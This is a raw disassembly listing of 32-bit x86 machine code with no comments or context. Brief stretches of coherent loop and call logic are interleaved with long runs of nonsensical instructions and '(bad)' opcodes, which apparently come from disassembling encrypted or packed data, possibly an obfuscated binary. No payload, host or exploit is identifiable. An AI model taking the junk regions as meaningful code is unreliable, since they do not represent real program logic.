  407329:	adc    DWORD PTR [ecx+0x184d6a0c],esi
  40732f:	ret    
  407330:	cwde   
  407331:	into   
  407332:	imul   ebp,DWORD PTR [eax+esi*1-0x3b],0xffffffc4
  407337:	add    eax,0x407ade8a
  40733c:	inc    ebx
  40733d:	sbb    dh,al
  40733f:	inc    ebx
  407340:	jl     0x4073b1
  407342:	cmp    dl,BYTE PTR [ebp-0x66]
  407345:	cwde   
  407346:	xor    al,0x5
  407348:	adc    ecx,DWORD PTR [edi]
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073eb
  407387:	dec    edi
  407388:	(bad)  
  407389:	cwde   
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x2d7e7e7c
  407393:	pop    ss
  407394:	popa   
  407395:	sub    DWORD PTR [edi+0x46],0xfffffff1
  407399:	mov    esi,0x9271d8f5
  40739e:	loopne 0x4073e8
  4073a0:	inc    esp
  4073a1:	(bad)  
  4073a3:	inc    ebx
  4073a4:	clc    
  4073a5:	adc    dh,BYTE PTR [esi+0x64]
  4073a8:	jno    0x4073ca
  4073aa:	test   DWORD PTR [ecx],ebp
  4073ac:	push   ecx
  4073ad:	mov    ch,0x89
  4073af:	mov    ch,0xcb
  4073b1:	imul   DWORD PTR [edi+0x8226014]
  4073b7:	arpl   bp,dx
  4073b9:	cmp    BYTE PTR [edx+0x3ab74405],ah
  4073bf:	je     0x4073c8
  4073c1:	mov    ch,0x5d
  4073c3:	aad    0x84
  4073c5:	cmp    edi,eax
  4073c7:	lock (bad) 
  4073c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ca:	jb     0x40739a
  4073cc:	sub    al,0x25
  4073ce:	push   0x28a5a643
  4073d3:	inc    edi
  4073d4:	(bad)  
  4073d5:	mov    ebp,0xb67a6263
  4073da:	enter  0x7372,0x28
  4073de:	das    
  4073df:	loopne 0x4073f6
  4073e1:	sti    
  4073e2:	mov    al,ds:0x99de6560
  4073e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073e8:	mov    BYTE PTR [edx-0x57],ch
  4073eb:	lea    ecx,[edx-0x331c07fc]
  4073f1:	sahf   
  4073f2:	jmp    0xe52e:0x2cce09f0
  4073f9:	xor    al,0xb6
  4073fb:	dec    ebp
  4073fc:	into   
  4073fd:	push   ebx
  4073fe:	mov    BYTE PTR [ebx+0x34422143],0xed
  407405:	fcomp  st(0)
  407407:	pop    esp
  407408:	inc    esp
  407409:	and    DWORD PTR [esi-0x388bb057],0xfffffff2
  407410:	jbe    0x4073fd
  407412:	out    dx,al
  407413:	loopne 0x407488
  407415:	mov    eax,0x495a44a
  40741a:	mov    ch,0x2d
  40741c:	mov    DWORD PTR [ebx],0xeac056af
  407422:	xchg   esi,eax
  407423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407424:	ss pop eax
  407426:	push   edx
  407427:	cmp    eax,0xf78deaf0
  40742c:	ret    
  40742d:	(bad)  
  40742e:	push   edx
  40742f:	mov    al,ds:0x2f4dba40
  407434:	cmp    eax,0xfa9578fb
  407439:	fistp  WORD PTR [edi-0x8f08958]
  40743f:	clc    
  407440:	sbb    BYTE PTR [edi],bl
  407442:	pop    esp
  407443:	and    DWORD PTR [eax+0x6a],0x3837e9d2
  40744a:	cmp    bh,cl
  40744c:	jbe    0x40749e
  40744e:	dec    eax
  40744f:	pop    esi
  407450:	cli    
  407451:	add    ch,al
  407453:	pop    ss
  407454:	sbb    al,0x8a
  407456:	scas   eax,DWORD PTR es:[edi]
  407457:	test   eax,0x118184fe
  40745c:	pushf  
  40745d:	fisubr DWORD PTR [edx+0x1829323]
  407463:	(bad)  
  407464:	stos   BYTE PTR es:[edi],al
  407465:	pop    ss
  407466:	loop   0x407461
  407468:	and    DWORD PTR [ecx+0xb],ebx
  40746b:	push   0x75556cb4
  407470:	xchg   edi,eax
  407471:	sub    edx,ecx
  407473:	sbb    al,0xc1
  407475:	sahf   
  407476:	xchg   esi,eax
  407477:	xlat   BYTE PTR ds:[ebx]
  407478:	xchg   ebx,eax
  40747a:	push   ss
  40747b:	push   cs
  40747c:	fstp   QWORD PTR [edi]
  40747e:	aad    0xb3
  407480:	mul    DWORD PTR [ecx-0x76931674]
  407486:	popf   
  407487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407488:	(bad)  
  40748a:	push   eax
  40748b:	mov    bh,0xb9
  40748d:	dec    esp
  40748e:	mov    edi,cs
  407490:	mov    eax,ds:0x25753713
  407495:	outs   dx,DWORD PTR ds:[esi]
  407496:	cli    
  407497:	ret    
  407498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407499:	xchg   ebp,eax
  40749a:	jp     0x4074a3
  40749c:	stc    
  40749d:	inc    edi
  40749e:	add    cl,cl
  4074a0:	mov    eax,0x7dd73588
  4074a5:	in     eax,0x17
  4074a7:	es ins DWORD PTR es:[edi],dx
  4074a9:	adc    DWORD PTR ds:0xf6353fb3,edi
  4074af:	or     al,0xb5
  4074b1:	sbb    DWORD PTR [eax],0x61d3baa0
  4074b7:	xor    edi,ebx
  4074b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ba:	and    ecx,DWORD PTR [ecx-0xa]
  4074bd:	xchg   DWORD PTR [ebp-0x1b],ecx
  4074c0:	(bad)  
  4074c1:	je     0x407477
  4074c3:	sub    DWORD PTR [ebp-0x571c95af],esp
  4074c9:	into   
  4074ca:	adc    BYTE PTR [edx-0x5e65260a],0x2e
  4074d1:	ins    BYTE PTR es:[edi],dx
  4074d2:	vpmadcsswd xmm8,xmm0,xmm7,xmm1
  4074d8:	sahf   
  4074d9:	pushf  
  4074da:	xchg   DWORD PTR [ebx],ebp
  4074dc:	nop
  4074dd:	nop
  4074de:	in     al,0xe3
  4074e0:	fs hlt 
  4074e2:	mov    al,ds:0xdb26cbc7
  4074e7:	mov    eax,ds:0xdee692f6
  4074ec:	sahf   
  4074ed:	bnd jae 0x407536
  4074f0:	push   ebx
  4074f1:	leave  
  4074f2:	ins    DWORD PTR es:[edi],dx
  4074f3:	sti    
  4074f4:	cmp    eax,0xa2434c86
  4074f9:	js     0x407573
  4074fb:	jle    0x407487
  4074fd:	pop    ecx
  4074fe:	jae    0x4074d3
  407500:	fistp  DWORD PTR [ecx]
  407502:	xor    BYTE PTR [ebp+edi*4-0xb7d1b1e],0x9c
  40750a:	std    
  40750b:	jl     0x40749b
  40750d:	push   ds
  40750e:	data16 ficom DWORD PTR [ebx]
  407511:	and    DWORD PTR [esp-0x4082cb8c],esi
  407518:	ds mov al,cl
  40751b:	and    al,0x9f
  40751d:	rcl    DWORD PTR [ebp-0x3556230e],0x14
  407524:	sti    
  407525:	std    
  407526:	les    edi,FWORD PTR [edi+0x43]
  407529:	mov    ch,0x3c
  40752b:	push   ss
  40752c:	adc    BYTE PTR [edx+0x2d3e5f67],al
  407532:	dec    ebp
  407533:	fidiv  WORD PTR [edi]
  407535:	dec    esi
  407536:	stos   DWORD PTR es:[edi],eax
  407537:	sub    bh,BYTE PTR [edx]
  407539:	retf   
  40753a:	mov    edi,DWORD PTR [eax+0x70]
  40753d:	mov    fs,WORD PTR [ebp+0x20d9f1ec]
  407543:	enter  0x1af1,0x26
  407547:	call   0xdb2e3cb
  40754c:	inc    eax
  40754d:	rol    DWORD PTR [edi-0x65853ec4],cl
  407553:	js     0x407549
  407555:	stc    
  407556:	sbb    eax,0x3b2f2d6e
  40755b:	pop    edx
  40755c:	pop    edi
  40755d:	mov    ?,WORD PTR [esi-0x34]
  407560:	fbstp  TBYTE PTR [esi-0xf]
  407563:	pop    edx
  407564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407565:	rcl    esi,cl
  407567:	cmp    eax,0x3f181310
  40756c:	jb     0x407569
  40756e:	and    al,BYTE PTR [ebp+edx*2-0x8]
  407572:	arpl   WORD PTR [eax+0x1],sp
  407575:	aam    0x44
  407577:	clc    
  407578:	mov    al,ds:0xff7378f7
  40757d:	pop    edx
  40757e:	push   0x1697b7f4
  407583:	xor    cl,dh
  407585:	xchg   esp,eax
  407586:	sbb    eax,0x90d4c6fd
  40758b:	jbe    0x407595
  40758d:	aas    
  40758e:	ficomp WORD PTR [ebx]
  407590:	mov    dh,0x25
  407592:	sub    bl,BYTE PTR [edi+ebx*8-0xe96c120]
  407599:	push   eax
  40759a:	dec    edi
  40759b:	lea    eax,[ecx-0x39]
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	push   edi
  407656:	mov    ah,0x1a
  407658:	inc    esp
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x1d7e7e7c
  407662:	or     eax,DWORD PTR [edi]
  407664:	call   DWORD PTR [ecx]
  407666:	outs   dx,DWORD PTR ds:[esi]
  407667:	dec    BYTE PTR [edi-0x5b]
  40766a:	sub    bl,0x86
  40766d:	sub    edx,DWORD PTR [eax]
  40766f:	in     eax,dx
  407670:	in     eax,dx
  407671:	jg     0x4076dd
  407673:	fisubr DWORD PTR [esi+0x11971d56]
  407679:	int    0x1e
  40767b:	jbe    0x407680
  40767d:	inc    esp
  40767e:	test   DWORD PTR [esi],edi
  407680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407681:	test   eax,0x4d0964fd
  407686:	jmp    0x1a158fdf
  40768b:	and    ebx,DWORD PTR [edi+0x41]
  40768e:	mov    ds:0xaf338a02,al
  407693:	mov    ?,eax
  407695:	mov    BYTE PTR [eax],cl
  407697:	inc    esi
  407698:	mov    al,ds:0x1946bd91
  40769d:	xor    ecx,DWORD PTR [esi+0x45718b54]
  4076a3:	jmp    0x407697
  4076a5:	sub    al,0xe0
  4076a7:	lods   al,BYTE PTR ds:[esi]
  4076a8:	iret   
  4076a9:	mov    al,ds:0xd79204e5
  4076ae:	repz repz dec edi
  4076b1:	jnp    0x4076f3
  4076b3:	(bad)  
  4076b4:	push   cs
  4076b5:	sbb    esp,edx
  4076b7:	call   FWORD PTR [ecx+0x7c]
  4076ba:	fsubr  DWORD PTR [eax+eiz*1+0xe]
  4076be:	js     0x4076b9
  4076c0:	hlt    
  4076c1:	jg     0x407715
  4076c3:	scas   eax,DWORD PTR es:[edi]
  4076c4:	cmp    al,BYTE PTR [edx-0x10bb2e15]
  4076ca:	scas   eax,DWORD PTR es:[edi]
  4076cb:	push   esp
  4076cc:	fbstp  TBYTE PTR [edi-0x70]
  4076cf:	dec    edi
  4076d0:	cmc    
  4076d1:	cmp    al,0xf9
  4076d3:	fdiv   st(4),st
  4076d5:	pusha  
  4076d6:	ins    BYTE PTR es:[edi],dx
  4076d7:	jb     0x4076f4
  4076d9:	sbb    al,BYTE PTR [ebx+0x43106983]
  4076df:	mov    edi,0x77768fc3
  4076e4:	push   0xca51c77d
  4076e9:	dec    ecx
  4076ea:	sub    DWORD PTR ds:0xe36afd6a,0xffffffc5
  4076f1:	sub    al,BYTE PTR [ecx-0x1b46e664]
  4076f7:	lea    edx,[edx]
  4076f9:	mov    WORD PTR [eax+edi*8+0x27],ss
  4076fd:	inc    esp
  4076fe:	cli    
  4076ff:	or     BYTE PTR [ebp+0x4b],0x89
  407703:	push   esi
  407704:	and    eax,0xc556a46c
  407709:	outs   dx,DWORD PTR ds:[esi]
  40770a:	lahf   
  40770b:	addr16 dec ebx
  40770d:	mov    esi,0x7b9bc4c8
  407712:	test   DWORD PTR [edx-0x40],ebx
  407715:	sbb    DWORD PTR [edi+0x5a810de1],esp
  40771b:	rol    al,0x90
  40771e:	fs xchg edi,eax
  407720:	mov    DWORD PTR [ebp+edx*1-0x3d],esi
  407724:	xor    eax,0x738fea6a
  407729:	in     al,0x6a
  40772b:	push   0x5d
  40772d:	or     DWORD PTR [esi],esi
  40772f:	mov    ebp,0xd45c7003
  407734:	xor    eax,0xbcbf89ac
  407739:	or     al,0x26
  40773b:	sbb    DWORD PTR [eax],0x3b62f130
  407741:	cs adc al,0xf5
  407744:	sub    eax,0x20ed3f1f
  407749:	fs ret 
  40774b:	in     al,dx
  40774c:	xor    ebp,DWORD PTR [ebx-0x41]
  40774f:	stos   BYTE PTR es:[edi],al
  407750:	(bad)  
  407751:	fdivr  QWORD PTR [ebx]
  407753:	iret   
  407754:	loopne 0x407734
  407756:	xor    BYTE PTR [esi+0x6d],al
  407759:	call   0xd5ff:0xafb51e54
  407760:	ds sub al,0x2e
  407763:	pop    ebx
  407764:	icebp  
  407765:	fidivr WORD PTR [ecx+0xd]
  407768:	ret    
  407769:	mov    edx,0xa39b9e76
  40776e:	int    0xfa
  407770:	jae    0x407782
  407772:	push   ecx
  407773:	cmp    eax,0x84d070cc
  407778:	add    eax,0x1eb0cf4d
  40777d:	test   BYTE PTR [eax-0x6df889f1],0xb3
  407784:	imul   eax,DWORD PTR [eax],0x90b7db9d
  40778a:	shr    ebx,cl
  40778c:	mov    fs,WORD PTR [esi+0x600848f4]
  407792:	pop    edx
  407793:	and    edx,DWORD PTR [eax+0x7a]
  407796:	mov    al,0xe6
  407798:	repnz mov esp,0x28ff0460
  40779e:	(bad)  
  40779f:	sar    DWORD PTR [eax],1
  4077a1:	in     eax,dx
  4077a2:	push   0xffffffa9
  4077a4:	cmp    DWORD PTR [ecx],0xca3b7050
  4077aa:	cwde   
  4077ab:	fcomp  st(4)
  4077ad:	ror    ah,0x1
  4077b0:	and    BYTE PTR [esi+0x70f47647],bh
  4077b6:	pop    edi
  4077b7:	ror    BYTE PTR ds:0xe87027e0,0x63
  4077be:	mov    ecx,eax
  4077c0:	jl     0x407779
  4077c2:	icebp  
  4077c3:	cmp    eax,0xcd3e305e
  4077c8:	imul   eax,DWORD PTR [edx],0x9dcfcdb3
  4077ce:	ss pop edi
  4077d0:	mov    ebp,?
  4077d2:	dec    esi
  4077d3:	mov    WORD PTR [edi],fs
  4077d5:	sub    DWORD PTR [esi-0x63],ebp
  4077d8:	sub    DWORD PTR [edi-0x21],edi
  4077db:	mov    edi,DWORD PTR [edi-0x2b]
  4077de:	mov    ebx,0x59428173
  4077e3:	pusha  
  4077e4:	dec    esp
  4077e5:	ret    
  4077e6:	xor    eax,0x4122aad9
  4077eb:	imul   edi,DWORD PTR [ebx-0x7927b4af],0xffffffdc
  4077f2:	or     cl,ch
  4077f4:	adc    DWORD PTR [esi+eiz*2],esi
  4077f7:	dec    esi
  4077f8:	sbb    eax,0x174fccde
  4077fd:	lock mov DWORD PTR [esi-0x6f],ecx
  407801:	dec    eax
  407802:	iret   
  407803:	xor    esp,DWORD PTR [ebx]
  407805:	rol    DWORD PTR [edx-0x36],0xe2
  407809:	jns    0x33ed3555
  40780f:	jne    0x407819
  407811:	mov    BYTE PTR [ebp+0x37],dl
  407814:	gs ins BYTE PTR es:[edi],dx
  407816:	bnd jo 0x4077ef
  407819:	jnp    0x4077a4
  40781b:	push   cs
  40781c:	ja     0x4077cc
  40781e:	lock (bad) 
  407820:	(bad)  
  407821:	in     al,0x55
  407823:	sub    eax,0xd8bf145
  407828:	aaa    
  407829:	mov    dh,0x4b
  40782b:	xchg   esi,eax
  40782c:	ja     0x4077c0
  40782e:	dec    edi
  40782f:	(bad)  
  407830:	shufps xmm1,XMMWORD PTR [ebp+0x1d],0x26
  407835:	ins    DWORD PTR es:[edi],dx
  407836:	and    eax,DWORD PTR [ebp+ebx*1+0x61]
  40783a:	or     ecx,edx
  40783c:	test   BYTE PTR [ecx+edx*1],0xd5
  407840:	jae    0x4077ca
  407842:	int3   
  407843:	mov    esi,0x993ee47c
  407848:	rcr    BYTE PTR [esi-0x9],cl
  40784b:	mov    ch,0xec
  40784d:	sbb    al,0x5f
  40784f:	imul   ebx,ebp,0xffffffc1
  407852:	(bad)  
  407853:	cli    
  407854:	sub    DWORD PTR [ecx-0x4e8db81],edx
  40785a:	or     al,0x5b
  40785c:	inc    ebp
  40785d:	mov    eax,0xf8f450c2
  407862:	or     BYTE PTR [eax-0x76fd3ad0],ch
  407868:	aaa    
  407869:	inc    ebx
  40786a:	mov    ch,0xff
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x5c,eax
  407922:	clc    
  407923:	hlt    
  407924:	sbb    al,0x24
  407926:	into   
  407927:	jle    0x4079a7
  407929:	add    eax,0x217e7e7c
  40792e:	sub    BYTE PTR [esi],ch
  407930:	mov    ebp,0x675a4442
  407935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407936:	mov    ch,0xd7
  407938:	sub    eax,0x1eee92f
  40793d:	aas    
  40793e:	stc    
  40793f:	scas   eax,DWORD PTR es:[edi]
  407940:	icebp  
  407941:	inc    ebp
  407942:	pop    ecx
  407943:	or     esi,DWORD PTR [esi+esi*1-0x5a]
  407947:	hlt    
  407948:	sub    bl,BYTE PTR [ebx-0x4a174ce7]
  40794e:	sahf   
  40794f:	and    eax,0x65457ba8
  407954:	mov    al,0x69
  407956:	inc    edi
  407957:	mov    ebp,0x6bc28037
  40795c:	shl    DWORD PTR ss:[edi-0x42],0x49
  407961:	es pop ds
  407963:	jmp    0xe50de78b
  407968:	js     0x407900
  40796a:	loop   0x40798e
  40796c:	mov    WORD PTR [edi],es
  40796e:	cmp    dh,BYTE PTR [eax]
  407970:	shr    DWORD PTR [esi-0x62],0xed
  407974:	out    0xb2,al
  407976:	jp     0x407920
  407978:	sbb    al,0xb0
  40797a:	test   BYTE PTR [ebx],cl
  40797c:	ja     0x4079fa
  40797e:	cmp    al,0xa0
  407980:	xor    al,0x27
  407982:	les    esi,FWORD PTR [esi]
  407984:	lock xchg DWORD PTR [edi],ebx
  407987:	and    eax,0x86297069
  40798c:	mov    esi,0x91c5678
  407991:	sub    BYTE PTR [ecx],cl
  407993:	cdq    
  407994:	fcom   DWORD PTR [ecx-0x64]
  407997:	das    
  407998:	push   ds
  407999:	cmp    edi,ecx
  40799b:	pop    bp
  40799d:	test   BYTE PTR [esi],bh
  40799f:	push   ecx
  4079a0:	in     eax,dx
  4079a1:	dec    DWORD PTR [eax+0x2a61714e]
  4079a7:	add    DWORD PTR [esi+0x63],ebp
  4079aa:	lock repz into 
  4079ad:	add    al,0xc1
  4079af:	sbb    DWORD PTR [esi],ecx
  4079b1:	jno    0x407a2b
  4079b3:	iret   
  4079b4:	stc    
  4079b5:	das    
  4079b6:	cmp    eax,0x78d7bd7f
  4079bb:	pop    edi
  4079bc:	mov    ds:0xc2982d0e,al
  4079c1:	add    eax,0xdf8d91a4
  4079c6:	jnp    0x407965
  4079c8:	xchg   esi,eax
  4079c9:	add    DWORD PTR [edx-0xa],ebx
  4079cc:	sbb    eax,0x2664834
  4079d1:	mov    bh,0xe6
  4079d3:	cld    
  4079d4:	out    0xcb,al
  4079d6:	sti    
  4079d7:	pop    es
  4079d8:	xor    eax,DWORD PTR ss:[ebp+edi*2-0x1]
  4079dd:	lock data16 add BYTE PTR [ebp-0x76a59c1f],bh
  4079e5:	ja     0x407988
  4079e7:	push   edx
  4079e8:	add    cl,BYTE PTR [eax-0x26451789]
  4079ee:	push   ecx
  4079ef:	dec    esi
  4079f0:	les    edx,FWORD PTR [ebx-0x176b060d]
  4079f6:	inc    ebx
  4079f7:	push   ebx
  4079f8:	outs   dx,DWORD PTR ds:[esi]
  4079f9:	jo     0x407a11
  4079fb:	rcr    eax,1
  4079fd:	rol    BYTE PTR ds:0xa2f57d0b,cl
  407a03:	add    BYTE PTR [edi-0x3a],dh
  407a06:	add    cl,BYTE PTR [ecx]
  407a08:	out    0x5f,al
  407a0a:	mov    BYTE PTR [ebx+0xe153f35],cl
  407a10:	lock pop esp
  407a12:	mov    bl,0xdf
  407a14:	fadd   DWORD PTR [esi+ebp*8+0x68]
  407a18:	sub    dh,dl
  407a1a:	nop
  407a1b:	mov    ds:0xb2ab36e6,eax
  407a20:	xor    al,0xdf
  407a22:	dec    esi
  407a23:	cdq    
  407a24:	xchg   BYTE PTR [edx-0x1d],dl
  407a27:	daa    
  407a28:	adc    BYTE PTR [eax+edx*2+0x6a202f98],ah
  407a2f:	sbb    ecx,DWORD PTR [edi-0xb477fe0]
  407a35:	and    al,BYTE PTR ds:0xb1ed9357
  407a3b:	xchg   DWORD PTR [ebp-0x37],edx
  407a3e:	out    0x86,al
  407a40:	sub    ebp,eax
  407a42:	adc    BYTE PTR [edx+ecx*8],ch
  407a45:	out    0x98,eax
  407a47:	push   ebp
  407a48:	inc    ebx
  407a49:	pop    ds
  407a4a:	jg     0x407a04
  407a4c:	cdq    
  407a4d:	push   0xffffff8b
  407a4f:	push   edi
  407a50:	cli    
  407a51:	in     al,dx
  407a52:	xor    BYTE PTR [edx+eax*4+0x22],bl
  407a56:	mov    al,0xc2
  407a58:	add    esi,ebp
  407a5a:	mov    ebx,0xc2e58e2
  407a5f:	sub    BYTE PTR [ecx+0x41fe3701],al
  407a65:	je     0x407a68
  407a67:	scas   eax,DWORD PTR es:[edi]
  407a68:	mov    eax,ds:0x50385a1c
  407a6d:	out    0xe5,al
  407a6f:	(bad)  
  407a70:	jbe    0x407abe
  407a72:	mov    ah,0x47
  407a74:	jns    0x407a20
  407a76:	or     dl,dh
  407a78:	cdq    
  407a79:	jmp    0x65fa:0x4803c41c
  407a80:	push   edi
  407a81:	fsubr  QWORD PTR ds:0xbbf01620
  407a87:	rol    DWORD PTR [esi],0x3f
  407a8a:	out    0xed,al
  407a8c:	adc    al,0x1e
  407a8e:	cmp    al,0x4b
  407a90:	xor    ebp,ecx
  407a92:	and    BYTE PTR [ecx+eax*2-0x4cbbf364],0x65
  407a9a:	lea    edx,[ebx-0x7061a99a]
  407aa0:	into   
  407aa1:	push   ds
  407aa2:	ins    DWORD PTR es:[edi],dx
  407aa3:	rol    BYTE PTR [ecx-0x6f],0x35
  407aa7:	sub    al,0xed
  407aa9:	cmp    dh,BYTE PTR [esi-0x21b335f7]
  407aaf:	and    al,0x8
  407ab1:	xor    bh,bl
  407ab3:	mov    dl,0xa7
  407ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ab6:	ja     0x407a5d
  407ab8:	mov    esi,ebx
  407aba:	mul    DWORD PTR [edx+edx*2+0xa2412f7]
  407ac1:	lock daa 
  407ac3:	sbb    eax,0x2140a8a8
  407ac8:	(bad)  
  407ac9:	jo     0x407aba
  407acb:	push   eax
  407acc:	outs   dx,BYTE PTR ds:[esi]
  407acd:	nop
  407ace:	sub    ebx,DWORD PTR [ebp+0x67a463c4]
  407ad4:	into   
  407ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad6:	mov    BYTE PTR [ebx+0x3679b85e],bh
  407adc:	push   ds
  407add:	cmp    eax,0x7fac02e7
  407ae2:	imul   edx,DWORD PTR [ecx-0x15c4b9b],0xe84a0e87
  407aec:	push   cs
  407aed:	test   DWORD PTR es:[edi-0x49],eax
  407af1:	in     eax,dx
  407af2:	in     eax,0x67
  407af4:	and    cl,bh
  407af6:	jg     0x407b3a
  407af8:	call   0xb9c1a762
  407afd:	adc    BYTE PTR [esi+0x77],bl
  407b00:	les    esp,FWORD PTR [ebx+0x7c]
  407b03:	xor    ecx,edi
  407b05:	add    al,0x20
  407b08:	xor    al,0x3b
  407b0a:	pop    ss
  407b0b:	cmp    DWORD PTR [esi],esi
  407b0d:	aaa    
  407b0e:	int3   
  407b0f:	jb     0x407aa9
  407b11:	lods   al,BYTE PTR ds:[esi]
  407b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b13:	dec    esp
  407b14:	cmp    al,0x3b
  407b16:	push   0xd
  407b18:	cli    
  407b19:	popa   
  407b1a:	and    edx,DWORD PTR [esi-0x24]
  407b1d:	dec    esi
  407b1e:	ins    DWORD PTR es:[edi],dx
  407b1f:	inc    ecx
  407b20:	rcl    BYTE PTR [eax],0x87
  407b23:	arpl   WORD PTR [ebp+0x4bc0e464],ax
  407b29:	(bad)  
  407b2a:	adc    DWORD PTR [ebx+0x18],eax
  407b2d:	aam    0xb3
  407b2f:	and    DWORD PTR cs:[ebp+0x19],eax
  407b33:	jmp    0xc133:0xbff7a783
  407b3a:	adc    DWORD PTR ds:0x4337ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
